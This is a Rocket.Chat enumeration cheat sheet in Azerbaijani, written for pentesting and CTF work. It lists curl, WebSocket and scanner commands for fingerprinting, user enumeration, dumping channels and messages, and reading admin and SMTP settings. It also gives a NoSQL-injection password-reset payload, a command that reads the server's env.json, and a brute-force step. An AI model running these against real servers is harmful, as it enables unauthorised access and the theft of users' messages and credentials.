# 🚀 Rocket.Chat — CMS Enumeration Cheat Sheet

> **Məqsəd:** Penetration testing / CTF / Red Team əməliyyatları üçün Rocket.Chat instansiyasının kəşfi və enumerasiyası.

---

## 1. Aşkarlama (Discovery)

### Standart Portlar və Yollar

```
http://<TARGET>/                        # Əsas giriş
http://<TARGET>/home                    # Ana səhifə
http://<TARGET>/admin                   # Admin paneli
http://<TARGET>/admin/info              # Server məlumatları
http://<TARGET>/api/v1/info             # API versiya məlumatı (auth lazım deyil)
http://<TARGET>/api/v1/settings.public  # İctimai konfiqurasiya parametrləri
```

### Rocket.Chat Fingerprint

```http
GET /api/v1/info HTTP/1.1
Host: <TARGET>
```

**Cavabda axtarılan sahələr:**
```json
{
  "info": {
    "version": "x.x.x",
    "build": { ... }
  }
}
```

### Nmap ilə Kəşf

```bash
nmap -sV -p 3000,80,443,8000,8080 <TARGET>
nmap -sC -sV --script=http-title <TARGET>
```

---

## 2. API Enumerasiyası (Unauthenticated)

### İctimai API Endpoint-ləri

```bash
# Server məlumatı
curl http://<TARGET>/api/v1/info

# İctimai parametrlər
curl http://<TARGET>/api/v1/settings.public

# Statistika (bəzən ictimadir)
curl http://<TARGET>/api/v1/statistics

# Serverin bağlılıq statusu
curl http://<TARGET>/api/v1/shield.svg
```

### Qeydiyyat statusunun yoxlanması

```bash
curl http://<TARGET>/api/v1/settings.public | jq '.data[] | select(.id | contains("Registration"))'
```

---

## 3. İstifadəçi Enumerasiyası

### Login Endpoint (Brute Force / User Enum)

```bash
# İstifadəçi yoxlama — fərqli xəta mesajlarına bax
curl -X POST http://<TARGET>/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"user": "admin", "password": "wrongpassword"}'
```

| Xəta Mesajı | Məna |
|---|---|
| `"error": "Unauthorized"` | İstifadəçi mövcud, şifrə yanlış |
| `"error": "User not found"` | İstifadəçi yoxdur |
| `"error": "totp-required"` | 2FA aktiv |

### İstifadəçi axtarışı (auth olmadan — köhnə versiyalar)

```bash
# v0.x.x köhnə versiyalarda
curl http://<TARGET>/api/v1/users.list

# Birbaşa istifadəçi sorğusu
curl "http://<TARGET>/api/v1/users.info?username=admin"
```

### Qeydiyyat Sayfası üzərindən Enum

```bash
# POST ilə qeydiyyat cəhdi — mövcud email/username yoxlama
curl -X POST http://<TARGET>/api/v1/users.register \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","pass":"Test1234","name":"Test","username":"testuser"}'
```

---

## 4. Kanal / Otaq Enumerasiyası

### Açıq Kanallar (auth olmadan — köhnə versiyalar)

```bash
# Açıq kanalların siyahısı
curl http://<TARGET>/api/v1/channels.list?count=100

# Kanal axtarışı
curl "http://<TARGET>/api/v1/channels.list?name=general"
```

### Auth ilə Kanal Enum

```bash
# Əvvəlcə login
TOKEN=$(curl -s -X POST http://<TARGET>/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"user":"<USER>","password":"<PASS>"}' \
  | jq -r '.data.authToken')

USER_ID=$(curl -s -X POST http://<TARGET>/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"user":"<USER>","password":"<PASS>"}' \
  | jq -r '.data.userId')

# Kanalları siyahıla
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     http://<TARGET>/api/v1/channels.list

# Birbaşa mesajlar
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     "http://<TARGET>/api/v1/channels.messages?roomId=GENERAL"
```

---

## 5. Admin Panel Enumerasiyası

### Admin Endpoint-ləri

```bash
# Server məlumatları (admin tələb edir)
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     http://<TARGET>/api/v1/statistics

# Bütün istifadəçilər (admin)
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     http://<TARGET>/api/v1/users.list

# Bütün parametrlər (admin)
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     http://<TARGET>/api/v1/settings

# E-poçt konfiqurasiyası
curl -H "X-Auth-Token: $TOKEN" \
     -H "X-User-Id: $USER_ID" \
     "http://<TARGET>/api/v1/settings?_id=SMTP_Host"
```

---

## 6. WebSocket Enumerasiyası (DDP Protocol)

Rocket.Chat, **Meteor DDP** protokolunu WebSocket üzərindən istifadə edir.

### WebSocket Bağlantısı

```bash
# wscat istifadəsi
wscat -c ws://<TARGET>/websocket

# Bağlandıqdan sonra əl ilə sorğu:
{"msg":"connect","version":"1","support":["1"]}
```

### Login via WebSocket

```json
{
  "msg": "method",
  "method": "login",
  "id": "1",
  "params": [{
    "user": { "username": "admin" },
    "password": {
      "digest": "<SHA256_OF_PASSWORD>",
      "algorithm": "sha-256"
    }
  }]
}
```

### Otaqları Enum et (WebSocket)

```json
{
  "msg": "method",
  "method": "rooms/get",
  "id": "2",
  "params": [{ "$date": 0 }]
}
```

---

## 7. Məlum Zəifliklər (CVE Reference)

| CVE | Versiya | Açıqlama |
|---|---|---|
| **CVE-2023-28314** | < 5.4.0 | XSS — mesaj rendering |
| **CVE-2023-25809** | < 5.3.7 | RCE — Livechat webhook |
| **CVE-2021-22911** | < 3.15.0 | NoSQL injection — şifrə sıfırlama |
| **CVE-2021-22912** | < 3.15.0 | Rate limiting bypass |
| **CVE-2019-16187** | < 1.3.0 | Autentifikasiyasız istifadəçi enum |
| **CVE-2018-11550** | < 0.65.0 | IDOR — fayl açıqlama |

### NoSQL Injection — Şifrə Sıfırlama (CVE-2021-22911)

```bash
# Token-based reset üçün NoSQL injection
curl -X POST http://<TARGET>/api/v1/users.forgotPassword \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}}'
```

---

## 8. Fayl və Konfiqurasiya Yolları

```bash
# Standart konfiqurasiya faylları (server tərəfi)
/opt/Rocket.Chat/.env
/var/www/rocketchat/.meteor/
/etc/rocketchat/
/root/.rocketchat/

# Docker mühitlərinde
docker exec -it rocketchat cat /app/bundle/programs/server/env.json
```

---

## 9. Avtomatlaşdırılmış Alətlər

```bash
# Nuclei şablonları
nuclei -u http://<TARGET> -t nuclei-templates/http/cves/ -tags rocketchat
nuclei -u http://<TARGET> -t nuclei-templates/http/exposed-panels/rocket-chat*

# WhatWeb ilə fingerprint
whatweb http://<TARGET>

# ffuf ilə endpoint brute-force
ffuf -u http://<TARGET>/api/v1/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,401,403

# Feroxbuster
feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## 10. API Versiya Fərqləri

| API Versiyası | Base URL | Qeyd |
|---|---|---|
| v1 | `/api/v1/` | Cari standart |
| v2 | `/api/v2/` | Bəzi yeni endpoint-lər |
| Legacy | `/api/` | Köhnə instansiyalar |

---

## 11. Sürətli Referans — Faydalı jq Filtrlər

```bash
# Bütün istifadəçi adlarını çıxar
curl ... /api/v1/users.list | jq '[.users[].username]'

# Bütün email-ləri çıxar
curl ... /api/v1/users.list | jq '[.users[].emails[].address]'

# Admin istifadəçiləri tap
curl ... /api/v1/users.list | jq '[.users[] | select(.roles[] | contains("admin"))]'

# Kanal adlarını siyahıla
curl ... /api/v1/channels.list | jq '[.channels[].name]'
```

---

## 12. Checklist

- [ ] `/api/v1/info` — versiya müəyyənləşdir
- [ ] `/api/v1/settings.public` — ictimai parametrləri topla
- [ ] Qeydiyyat açıqdırmı? (open registration)
- [ ] 2FA aktiv deyilsə brute-force cəhd et
- [ ] WebSocket DDP endpoint-i yoxla
- [ ] Admin panelinə `/admin` üzərindən giriş cəhdi
- [ ] Köhnə CVE-lər üçün versiyaya bax
- [ ] Nuclei ilə avtomatik skan et
- [ ] Kanal/otaq mesajlarını topla
- [ ] SMTP / e-poçt konfiqurasiyasını yoxla

---

> ⚠️ **Qeyd:** Bu cheat sheet yalnız **qanuni** penetration testing, CTF yarışmaları və **icazəli** təhlükəsizlik testləri üçün nəzərdə tutulmuşdur. İcazəsiz sistemlərə qarşı istifadə qanunsuz və etik deyildir.
